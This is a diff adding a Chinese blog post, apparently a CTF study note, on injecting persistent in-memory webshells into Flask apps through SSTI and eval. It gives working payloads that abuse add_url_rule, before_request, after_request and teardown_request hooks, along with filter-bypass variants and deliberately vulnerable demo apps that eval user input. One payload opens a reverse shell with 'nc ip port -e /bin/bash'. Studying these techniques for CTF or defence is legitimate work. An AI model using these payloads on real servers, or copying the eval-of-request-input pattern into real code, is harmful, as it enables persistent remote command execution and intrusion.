@@ -438,6 +438,245 @@
       </categories>
   </entry>
   <entry>
+    <title>Python内存马探究</title>
+    <url>/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p>比较重要</p>
+<span id="more"></span>
+
+<h1 id="Python内存马分析"><a href="#Python内存马分析" class="headerlink" title="Python内存马分析"></a>Python内存马分析</h1><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>常用的<code>Python</code>框架有<code>Django</code>、<code>Flask</code>, 这两者都可能存在<code>SSTI</code>漏洞. <code>Python内存马</code>利用<code>Flask</code>框架中<code>SSTI</code>注入来实现，<code>Flask</code>框架中在<code>web</code>应用模版渲染的过程用到**<code>render_template_string</code>**函数进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现<code>Python</code>内存马的注入</p>
+<h3 id="Flask-请求上下文管理机制"><a href="#Flask-请求上下文管理机制" class="headerlink" title="Flask 请求上下文管理机制"></a>Flask 请求上下文管理机制</h3><p>当网页请求进入<code>Flask</code>时，会实例化一个<code>Request Context</code>。在<code>Python</code>中分出了两种上下文：请求上下文（request context）、应用上下文（session context）。一个请求上下文中封装了请求的信息，而上下文结构是运用了一个<code>Stack</code>的栈结构，也就是说它拥有一个栈所拥有的全部特性。<code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</p>
+<h3 id="旧版Flask内存马分析"><a href="#旧版Flask内存马分析" class="headerlink" title="旧版Flask内存马分析"></a>旧版<code>Flask</code>内存马分析</h3><p>可以编写一个demo</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>原始<code>Flask</code>内存马<code>Payload</code>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>在成功运行后就可以在<code>/shell?cmd=ls</code>执行命令。</p>
+<p><strong>注意：如果想在其他地方利用就需要加上<code>render_template_string()函数</code>，就是将payload改成符合格式后包含到这个函数当中。</strong>比如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=render_template_string(<span class="string">&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">同时结合下面的payload的分析，直接<span class="built_in">eval</span>(<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span>)也行</span><br></pre></td></tr></table></figure>
+
+<p><strong>局限：</strong></p>
+<p>在现在新版<code>Flask</code>使用这个payload会出现以下问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AssertionError: The setup method &#x27;add_url_rule&#x27; can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.</span><br><span class="line">Make sure all imports, decorators, functions, etc. needed to set up the application are done before running it.</span><br></pre></td></tr></table></figure>
+
+<p>这说明新版<code>Flask</code>无法再在应用程序上调用安装方法<code>&quot;add_url_rule&quot;</code>，所以应该是用不了这个方法的，下面了解一下思想即可，但遇到题的时候还是可以先试试这个方法。</p>
+<h4 id="Payload分析"><a href="#Payload分析" class="headerlink" title="Payload分析"></a>Payload分析</h4><p>将payload拆分开，逐层分析</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>
+
+<h6 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h6><p>对于<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>这一截，<code>url_for</code>是<code>Flask</code>的一个内置函数，通过<code>Flask</code>内置函数可以调用其<code>__global__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入得<code>modules</code>，可以看到这里是支持<code>__builtins__</code>的。</p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518143651820.png" alt="image-20240518143651820"></p>
+<p><strong>在<code>__builtins__</code>模块中，<code>Python</code>在启动时就直接为我们导入了很多内建函数</strong>，准确的说，<code>python</code>在启动时会首先加载内建名称空间，内建名称空间中有许多名字到对象之间的映射, 这些名字就是内建函数的名称, 对象就是这些内建函数对象。现在再来跟进一下<code>__builtins__</code>模块：</p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518144123444.png" alt="image-20240518144123444"></p>
+<p>可以看到，在<code>__builtins__</code>模块中存在eval、exec等命令执行函数的。</p>
+<p>此时在ssti中就可以尝试直接进行rce，如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518204521230.png" alt="image-20240518204521230"></p>
+<h6 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h6><p>现在继续看<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda  :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,  &#39;whoami&#39;)).read())</code>这一截payload，分析一下代码：</p>
+<ol>
+<li><ul>
+<li><p>这行代码使用 Flask 的 <code>add_url_rule</code> 方法来添加一个路由规则。</p>
+</li>
+<li><p>第一个参数 <code>&#39;/shell&#39;</code> 是 URL 规则的路径。</p>
+</li>
+<li><p>第二个参数 <code>&#39;shell&#39;</code> 是视图函数的名称。</p>
+</li>
+<li><p>第三个参数是一个 lambda 表达式，它定义了视图函数的行为。</p>
+<ul>
+<li><p>lambda 表达式没有参数，因此 <code>lambda:</code> 后面没有任何参数列表。</p>
+</li>
+<li><p>lambda 表达式的主体部分 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br></pre></td></tr></table></figure>
+
+<p> 是一个表达式，它执行了如下操作：</p>
+<ul>
+<li>从请求上下文堆栈 <code>_request_ctx_stack.top</code> 中获取请求对象 <code>request</code>。</li>
+<li>使用 <code>request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code> 获取名为 <code>&#39;cmd&#39;</code> 的请求参数，如果没有指定 <code>&#39;cmd&#39;</code> 参数，则默认为 <code>&#39;whoami&#39;</code>。</li>
+<li>将获取到的命令传递给 <code>os.popen()</code> 函数执行，并读取其输出。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>因此，这行代码添加了一个能够执行命令的路由规则。</p>
+</li>
+</ul>
+</li>
+<li><p>lambda 表达式：</p>
+<ul>
+<li>lambda 表达式是一种匿名函数，它可以在不使用 <code>def</code> 关键字的情况下创建函数。</li>
+<li>lambda 表达式的一般形式是 <code>lambda 参数列表: 表达式</code>。</li>
+<li>lambda 表达式的主要优点是可以在一行内定义简单的函数。</li>
+</ul>
+</li>
+</ol>
+<p>这段代码的意图是添加一个路由规则，使得通过访问 <code>/shell</code> 路径并传递命令参数可以执行命令，并返回其输出结果。Lambda 表达式被用于定义这个简单的视图函数。</p>
+<p>而在<code>Flask</code>中注册路由的时候是天剑<code>@app.route()</code>装饰器来实现的，跟进源码看看</p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518205342399.png" alt="image-20240518205342399"></p>
+<p>确实就是调用的<code>add_url_rule()</code>函数来添加路由。</p>
+<h6 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h6><p>**先说明一下为什么在第二部分与第三部分之间要用<code>,</code>**：</p>
+<p>在这个代码片段中，逗号 <code>,</code> 的作用是将两个参数传递给 <code>eval</code> 函数。在 Python 中，<code>eval</code> 函数可以接受两个参数：第一个参数是要执行的代码字符串，第二个参数是一个字典，用于指定 <code>eval</code> 函数执行代码时的全局和局部命名空间。</p>
+<p>其中第三部分就属于<code>eval函数</code>的第二个参数，其中包含了两个键值对：</p>
+<ol>
+<li><code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;]</code>：将 <code>_request_ctx_stack</code> 对象作为全局命名空间的一部分传递给 <code>eval</code> 函数。</li>
+</ol>
+<p>​    2.<code>&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]</code>：将 <code>current_app</code> 对象作为全局命名空间的一部分传递给 <code>eval</code> 函数。</p>
+<p>这样做的目的是为了让 <code>eval</code> 函数在执行代码时能够访问到 <code>app</code> 和 <code>_request_ctx_stack</code> 对象，因为这些对象在原始代码中被引用到了。</p>
+<p><strong>现在来看最后一部分：</strong><code>&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code></p>
+<p><code>_request_ctx_stack</code>是<code>Flask</code>的一个全局变量，是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>. <code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>。</p>
+<p>到此, 大致逻辑基本就梳理清晰了, <code>eval</code>函数的功能即动态创建一条路由, 并在后面指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到.</p>
+<h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><ul>
+<li><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code>.</li>
+<li>代码执行函数替换, 如<code>exec</code>等替换<code>eval</code>.</li>
+<li>字符串可采用拼接方式, 如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>.</li>
+<li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换.</li>
+<li><code>[]</code>可用<code>.__getitem__()</code>或<code>.pop()</code>替换.</li>
+<li>过滤<code>&#123;&#123;`或者`&#125;&#125;</code>, 可以使用<code>&#123;%`或者`%&#125;</code>绕过, <code>&#123;%%&#125;</code>中间可以执行<code>if</code>语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.</li>
+<li>过滤<code>_</code>可以用编码绕过, 如<code>__class__</code>替换成<code>\x5f\x5fclass\x5f\x5f</code>, 还可以用<code>dir(0)[0][0]</code>或者<code>request[&#39;args&#39;]</code>或者<code>request[&#39;values&#39;]</code>绕过.</li>
+<li>过滤了<code>.</code>可以采用<code>attr()</code>或<code>[]</code>绕过.</li>
+<li>其它的手法参考<code>SSTI</code>绕过过滤的方法即可…</li>
+</ul>
+<p>还有的关于绕过的变形payload可以在参考文章里面看</p>
+<p>参考文章：</p>
+<p><code>https://xz.aliyun.com/t/10933?time__1311=mq%2BxB70QD%3D9xlxGgrDyiDcDjOAHr6e%2BYx&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-0</code></p>
+<h3 id="新版Flask内存马"><a href="#新版Flask内存马" class="headerlink" title="新版Flask内存马"></a>新版<code>Flask</code>内存马</h3><p>正如在上面旧版<code>Flask</code>提出的<code>add_url_rule</code>函数在当前较新的<code>Flask</code>版本已经不再支持在程序运行的过程中通过add_url_rule添加路由了。如下：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518223939172.png" alt="image-20240518223939172"></p>
+<p>所以，我们只能通过其他方式添加路由来处理我们的请求。</p>
+<p><strong>测试了一下，下面的几种方法无论环境中是否有debug模式都能打。</strong></p>
+<h4 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h4><p>在<code>Flask</code>中，<code>before_request</code>是一个装饰器，<strong>它用于在请求处理之前执行特定的函数</strong>。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等。</p>
+<p>跟一下<code>@app.before_request()</code>装饰器源码：</p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519125940205.png" alt="image-20240519125940205"></p>
+<p>可以在这里看到这个<code>before_request</code>装饰器实际上调用的是<code>self.before_request_funcs.setdefault(None, []).append(f)</code>,解释一下：</p>
+<ul>
+<li><code>before_request_funcs</code>：是 Flask 应用实例的一个属性，用于存储在每次请求之前执行的函数。</li>
+<li><code>setdefault(None, [])</code>：这是一个字典方法，用于设置字典中指定键的默认值。在这里，如果字典中不存在键为 <code>None</code> 的值，就将 <code>None</code> 的默认值设置为一个空列表 <code>[]</code>。</li>
+<li><code>.append(f)</code>：无论<code>None</code>键是否存在，都会将传入的函数 <code>f</code> 添加到对应键的列表中，即添加到 <code>before_request_funcs</code> 字典中 <code>None</code> 键对应的列表中。</li>
+</ul>
+<p>这个函数<code>f</code>就是我们要添加的函数。</p>
+<p>写一个源码程序来测试：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    a = <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用如下payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/e?cmd=app.before_request_funcs.setdefault(None, []).append(lambda: __import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())</span><br></pre></td></tr></table></figure>
+
+<p><strong>这样后续所有的访问结果都将变为命令执行的结果</strong></p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518225750706.png" alt="image-20240518225750706"></p>
+<p>同样可以改改，结合旧版内存马对payload的分析，比如这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=app.before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;name&#x27;)).read())</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以同时执行多条命令</p>
+<p>同样可以从测试源码中看到想要直接使用可以用<code>str()</code>函数包裹或者直接<code>eval()</code>包裹也行，测试一下(将返回值改了)：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    a = <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>不加<code>str()</code>：</strong><br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519134059111.png" alt="image-20240519134059111"></p>
+<p><strong>加<code>str()</code>：</strong><br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519134305823.png" alt="image-20240519134305823"></p>
+<p>都成功了，但是在测试过程中发现最好还是加上<code>str()</code>函数，虽然都可以执行成功，本地测试过程有点细微差别。</p>
+<p>由此可见通过<code>before_request</code>添加内存马这一条路是可行的，但同样会有一点问题，就是使用lambda必然会得到一个返回值，那么服务后续的操作都无法进行，会影响到主机的正常业务。</p>
+<h4 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h4><p>还可以尝试<code>@app.after_request</code>来解决，与<code>@app.before_request</code>类似，**<code>after_request</code>会在请求结束得到响应包之后进行操作**，跟进一下源码看看：</p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519135826767.png" alt="image-20240519135826767"></p>
+<p>底层源码和<code>before_request</code>好像。</p>
+<p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>传入的f就是对应的自定义函数，但这里的f需要接受一个reponse对象，同时返回一个reponse对象。</p>
+<p>但是我们仅通过lambda无法对原始传进来的reponse进行修改后再返回，所以需要重新生成一个response对象，然后再返回这个response。</p>
+<p>访问对应的url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=str(app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;)==None else resp))</span><br></pre></td></tr></table></figure>
+
+<p>函数的内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lambda resp: #传入参数</span><br><span class="line">    CmdResp if request.args.get(&#x27;cmd&#x27;) and      #如果请求参数含有cmd则返回命令执行结果</span><br><span class="line">    exec(&#x27;</span><br><span class="line">        global CmdResp;     #定义一个全局变量，方便获取</span><br><span class="line">        CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span><br><span class="line">    &#x27;)==None    #恒真</span><br><span class="line">    else resp)  #如果请求参数没有cmd则正常返回</span><br><span class="line">#这里的cmd参数名和CmdResp变量名都是可以改的，最好改成服务中不存在的变量名以免影响正常业务</span><br></pre></td></tr></table></figure>
+
+<p>所以利用也是差不多的，本地测试一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    <span class="comment"># 获取传入的 cmd 参数，并执行 eval</span></span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        result = <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No command provided&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>有str()函数</strong>：</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=str(app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;)==None else resp))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519152944681.png" alt="image-20240519152944681"></p>
+<p>注意：不知道为啥我本地测试在原先传入的<code>e</code>路由传入命令不行，需要另外传路由，如上就有正常页面</p>
+<p>本地测试显示：</p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519153125867.png" alt="image-20240519153125867"></p>
+<p>但是在一道ctf题（H&amp;NCTF2024 ezFlask）可以直接在原路由进行传入<code>cmd</code>进行rce，但是那道题的<code>flask版本</code>挺低的，<code>add_url_rule()</code>可用并且是post传入cmd来更改路由再get传入的。这里注意一下。</p>
+<p><strong>无<code>str()</code>函数：</strong><br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;)==None else resp)</span><br></pre></td></tr></table></figure>
+
+<p>如下成功执行：</p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519160145954.png" alt="image-20240519160145954"></p>
+<p>但是同样有上面那个问题并且在那道题目中可以复现。</p>
+<h4 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h4><p>在 Flask 中，每次接收到一个请求并处理完毕后，都会调用 <code>teardown_request()</code> 函数。这个函数可以被开发人员用来释放请求过程中分配的资源或执行其他清理操作。只需要在代码中定义一个函数并使用<code>@app.teardown_request</code> 装饰器即可。Flask 框架会在每个请求处理结束后自动调用这个函数。</p>
+<p>看一看这个装饰器的源码：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519183513601.png" alt="image-20240519183513601"></p>
+<p>和上面那两个方法的源码都挺像的。</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;ls&gt;1.txt&#x27;))</span><br><span class="line">或者</span><br><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls&gt;5.txt&#x27;).read())</span><br></pre></td></tr></table></figure>
+
+<p>测试一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    <span class="comment"># 获取传入的 cmd 参数，并执行 eval</span></span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        result = <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No command provided&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>传入的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls &gt; 10.txt&#x27;).read())</span><br></pre></td></tr></table></figure>
+
+<p>成功执行生成了一个10.txt文件：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519195626724.png" alt="image-20240519195626724"></p>
+<p>并且测试了一下的确没有回显，尝试一下反弹shell，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;nc ip port -e /bin/bash&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>也成功连上。</p>
+<p>测试一下<code>after_request</code>的payload(改一下基本函数即可)：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=str(app.teardown_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(\&#x27;ls&gt;11.txt\&#x27;).read())&#x27;)==None else resp))</span><br></pre></td></tr></table></figure>
+
+<p>也成功执行：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519195925114.png" alt="image-20240519195925114"></p>
+<p>暂时就这两种payload。</p>
+<h4 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h4><p>gxngxngxn师傅找到的，<a href="https://www.cnblogs.com/gxngxngxn/p/18181936">文章</a>，只能说牛逼</p>
+<p>简单给点代码试试：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">errorhandler</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error_handler(404)&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;404 Error&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个代码中，使用了装饰器<code>@errorhandler(404)</code>注册了一个钩子函数<code>errorhandler()</code>函数，当发生HTTP 404 错误（页面不存在）时，调用钩子函数，跟进装饰器源码看看：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519173140213.png" alt="image-20240519173140213"></p>
+<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519173149931.png" alt="image-20240519173149931"></p>
